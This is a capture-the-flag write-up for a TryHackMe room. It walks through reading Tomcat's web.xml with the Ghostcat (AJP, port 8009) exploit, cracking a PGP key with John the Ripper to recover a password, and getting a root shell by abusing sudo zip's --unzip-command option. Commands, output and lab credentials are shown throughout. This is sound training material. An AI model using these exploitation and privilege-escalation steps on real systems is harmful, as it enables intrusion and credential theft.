- OK, so port 8009 with `ajp13` looks pretty suspicious to me and I wanted to exploit it, I found the right Ghostcat exploit for reading `/WEB-INF/web.xml` on the vulnerable server. You can find the exploit [here](https://github.com/00theway/Ghostcat-CNVD-2020-10487.git), it's a pretty cool one.
  
- I also did some digging on the web app, specifically through `manager-gui` since I already did the CTF room with that type of exploitation but unfortunately couldn't make it work. Let's move to exploitation and gaining access!

---

## ‚öôÔ∏è Gaining Access

- `AjpShooter` script is easy to use, you clone the repo and then run the script with Python. It requires two arguments, `host` and `port`, after these inputs add the `/WEB-INF/web.xml` with flag `read` and it's done.
  We want to read `/WEB-INF/web.xml` since it contains credentials. Here's the output of that script. For more details about the script run `python3 ajpShooter -h` or check creators GitHub README.md.

  ```
  git clone https://github.com/00theway/Ghostcat-CNVD-2020-10487.git
  cd CNVD-2020-10487

  python3 ajpShooter.py http://10.10.120.105:8080 8009 /WEB-INF/web.xml read

  ```
  
- Awesome! With obtained credentials `skyfuck:8730281lkjlkjdqlksalks`, I logged in with SSH and got into the system. Flags here I come!

---

## üßç User Privilege Escalation

- As with any other CTF, getting user flag is pretty simple and straightforward, just dig around and you'll find it!

  ```
  skyfuck@ubuntu:~$ whoami
  skyfuck
  
  skyfuck@ubuntu:~$ pwd
  /home/skyfuck
  
  skyfuck@ubuntu:~$ ls
  credential.pgp  tryhackme.asc
  skyfuck@ubuntu:~$ 
  
  
  skyfuck@ubuntu:/home/merlin$ cat user.txt
  THM{GhostCat_1s_so_cr4sy}
  ```
  
- User flag checked! So now moving to root. When I used `sudo -l` as this user I got permission denied which is fine, but the thing is, in his home directory there are two files that are important to us: `credential.pgp` and `tryhackme.asc`.
  
- So when I saw them, I immediately thought that after cracking them I'll get root credentials, but little did I know tho... Transfer those files to your Kali machine, convert `.asc` file into hash and crack it in order to get passphrase for cracking `.pgp`

  ```
  gpg2john tryhackme.asc > keyhash.txt
  
  john --wordlist=/rockyou.txt keyhash.txt 
  alexandru        (tryhackme)
  ```

- Perfect, passphrase obtained from cracking PGP Private Key, now let's decrypt the `.pgp` file in order to get credentials. Process is very simple, import the `.asc` key and then decrypt the `.pgp` file.
  When you are prompted to insert passphrase, use the passphrase that we found in previous step.

  ```
  gpg --import tryhackme.asc 
  gpg: key ABCDE12345FKSJF58: public key "tryhackme <stuxnet@tryhackme.com>" imported
  gpg: key ABCDE12345FKSJF58: secret key imported
  gpg: key ABCDE12345FKSJF58: "tryhackme <stuxnet@tryhackme.com>" not changed
  gpg: Total number processed: 2
  gpg:               imported: 1
  gpg:              unchanged: 1
  gpg:       secret keys read: 1
  gpg:   secret keys imported: 1
  
  gpg --output decrypted.txt --decrypt credential.pgp
  gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
  gpg: encrypted with 1024-bit ELG key, ID ABCDE12345FKSJF58-, created 2020-03-11
        "tryhackme <stuxnet@tryhackme.com>"

  cat decrypted.txt 
  merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
  ```

- Legoooo, credentials for another user obtained! Firstly I thought that this is a hash, but little did I know that is just a password for SSH. I ran it through John and Haiti anyway and got nothing.

  ```
  haiti -e asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j                                   
  BigCrypt [JtR: bigcrypt]

  echo 'asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j' > merlin.hash

  john --wordlist=/rockyou.txt --format=bigcrypt merlin.hash
  ```

## üëë Root Privilege Escalation

- Now finishing the job. You will need to login as `merlin` in order to escalate privileges, when you run `id` on both users you will see the difference in output.

  ```
  merlin@ubuntu:~$ id
  uid=1000(merlin) gid=1000(merlin) groups=1000(merlin),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)
  
  merlin@ubuntu:~$ cat /root/root.txt
  cat: /root/root.txt: Permission denied
  ```
  
- What I always do first is `sudo -l`, when I ran it with previous user I got permission denied, but with `merlin` it's a completely different story.

  ```
  merlin@ubuntu:~$ sudo -l
  Matching Defaults entries for merlin on ubuntu:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User merlin may run the following commands on ubuntu:
      (root : root) NOPASSWD: /usr/bin/zip
  ```
  
- That's it, zip is our way to root since we can run it with sudo privileges without needing a password. You can find the commands on how to escalate on [GTFOBins](https://gtfobins.github.io/gtfobins/zip/) but I used a different method, both methods will work and they do the exact same thing.

- This was my approach. First, I created a simple shell script and made it executable.

  ```
  merlin@ubuntu:~$ echo 'sh' > shell.sh
  merlin@ubuntu:~$ chmod +x shell.sh
  ```

- Now since I have shell, I abused zip‚Äôs `-T` and `--unzip-command` options to execute my shell. The `-T` flag is for testing the archive, and `--unzip-command="sh #"` tells zip to use sh to extract files. Since the command runs with sudo, it gives me a root shell.

  ```
  merlin@ubuntu:~$ sudo zip exploit.zip shell.sh -T --unzip-command="sh #"
  adding: shell.sh (stored 0%)
  # whoami
  root
  # cat /root/root.txt
  THM{Z1P_1S_FAKE}
  ```

- CTF done, cya in the next one! üíã

## üèÅ Flags

- **User Flag**: `THM{GhostCat_1s_so_cr4sy}`
- **Root Flag**: `THM{Z1P_1S_FAKE}`

## üí¨ Notes & Reflections

- What was challenging in this room for me?
  `Finding the right exploit as always. AjpShooter exploit is so sick ngl!`

- What did I learn?
  `New exploits and a new way of privilege escalation. Escalating to root with ZIP is awesome!`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! ü§ü
